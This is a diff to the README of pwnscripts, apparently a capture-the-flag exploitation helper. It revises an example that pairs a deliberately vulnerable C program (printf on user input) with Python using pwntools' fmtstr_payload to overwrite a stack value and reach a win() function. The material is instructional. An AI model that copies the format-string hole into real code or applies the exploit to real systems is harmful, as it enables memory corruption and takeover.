@@ -13,14 +13,19 @@ It's messy and it works. Current features:
     2. _libc/_PIE: find a libc/PIE address with a specific offset
     ```python
     '''Imagine a C program like the following:
-    int main() {    # amd64
+    #include <stdio.h>
+    #include <string.h>
+    void win() { puts("great job"); }
+    int main() {
         char s[64];
         memset(s, 0, 64);
+        printf("%p\n", s);
         fgets(s, 50, stdin);
-        printf("%p\n", s)
         printf(s);
         if (*(int*)(s+56) == 0x12345678) win();
-    }'''
+    } // gcc main.c -o main.o'''
+    from pwnscripts import *
+    context.binary = 'main.o'
     def printf(l: str): # First, a function to abstract out the printf() i/o for pwnscripts
         r = remote(...)
         r.sendafter('\n', l)
@@ -30,7 +35,7 @@ It's messy and it works. Current features:
     # Then we use pwntools' fmtstr_payload to proceed:
     r = remote(...)
     addr = extract_first_hex(r.recvline())  #another pwnscripts func
-    payload = fmtstr_payload(offset, {addr: 0x12345678})
+    payload = fmtstr_payload(offset, {addr+56: 0x12345678}, write_size='short')
     r.sendline(payload)
     r.interactive()
     ```
